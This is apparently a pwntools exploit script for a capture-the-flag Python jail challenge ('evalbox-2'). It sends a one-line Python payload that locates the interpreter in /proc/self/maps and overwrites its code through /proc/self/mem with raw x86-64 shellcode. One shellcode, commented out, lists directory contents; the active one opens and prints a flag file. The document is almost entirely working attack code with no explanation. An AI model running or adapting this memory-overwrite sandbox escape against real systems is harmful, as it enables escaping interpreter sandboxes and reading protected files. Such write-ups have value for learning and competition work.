#!/usr/bin/python3
from pwn import *

exe = './app.py'
# elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
# p = remote("evalbox-2.chal.ctf.acsc.asia", 9341)

#part 1 - get all file names.
# shellcode = b"\xba\x00\x00\x00\x00\x48\x8d\x35\x74\x00\x00\x00\x48\xc7\xc7\x9c\xff\xff\xff\xb8\x01\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x00\x10\x00\x00\xb8\x4e\x00\x00\x00\x0f\x05\x49\x89\xc7\x4d\x31\xf6\x31\xd2\xeb\x00\x66\x42\x8b\x54\x34\x10\x83\xea\x14\x4a\x8d\x74\x34\x12\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xba\x01\x00\x00\x00\x48\x8d\x35\x60\x00\x00\x00\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x66\x42\x8b\x54\x34\x10\x41\x01\xd6\x4d\x39\xfe\x7c\xc0\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05\x00\x2f\x68\x6f\x6d\x65\x2f\x74\x6f\x75\x72\x70\x72\x61\x6e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x61\x6c\x6c\x2d\x6d\x79\x2d\x70\x77\x6e\x2d\x77\x6f\x72\x6b\x2f\x70\x79\x74\x68\x6f\x6e\x2d\x6a\x61\x69\x6c\x2d\x73\x65\x63\x63\x6f\x6d\x70\x00\x0a"

#part 2 - open, read, write.
shellcode = b"\xb8\x02\x00\x00\x00\x48\x8d\x3d\x34\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x64\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x64\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x00\x00\x2f\x68\x6f\x6d\x65\x2f\x74\x6f\x75\x72\x70\x72\x61\x6e\x2f\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x61\x6c\x6c\x2d\x6d\x79\x2d\x70\x77\x6e\x2d\x77\x6f\x72\x6b\x2f\x70\x79\x74\x68\x6f\x6e\x2d\x6a\x61\x69\x6c\x2d\x73\x65\x63\x63\x6f\x6d\x70\x2f\x66\x6c\x61\x67\x2d\x30\x64\x32\x37\x32\x33\x30\x38\x38\x37\x65\x35\x35\x61\x62\x38\x35\x39\x33\x39\x61\x66\x31\x33\x64\x63\x65\x30\x63\x37\x36\x62\x2e\x74\x78\x74\x00"
code = f"""
all(map(
 lambda fs: [
  fs[1].seek(int(fs[0].read(12),16)+0x18ebb8,0),
  fs[1].write({shellcode}),
  fs[1].flush(),
  input()
 ],
 [(open("/proc/self/maps"), open("/proc/self/mem", "wb"))]
))
""".replace("\n", "")

p.sendline(code)

p.interactive()
